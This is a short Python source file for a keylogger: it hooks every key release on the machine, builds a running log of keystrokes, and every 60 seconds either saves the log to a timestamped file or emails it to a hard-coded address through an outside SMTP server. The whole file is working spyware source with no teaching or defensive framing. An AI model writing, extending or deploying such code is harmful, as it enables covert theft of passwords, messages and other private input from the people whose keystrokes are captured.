import keyboard
import smtplib
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60

EMAIL_ADDRESS = "osweb@mailto.plus"
EMAIL_PASSWORD = "pass"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_date)[:-7].replace(" ", " -").replace(":", "")
        end_dt_str = str(self.end_date)[:-7].replace(" ", " -").replace(":", "")
        self.file_name = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.file_name}", "w") as f:
            print(self.log, file=f)
        print(f"[+]" "saved")

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.mail.ru", port=465)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.send_mail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            self.start_date = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
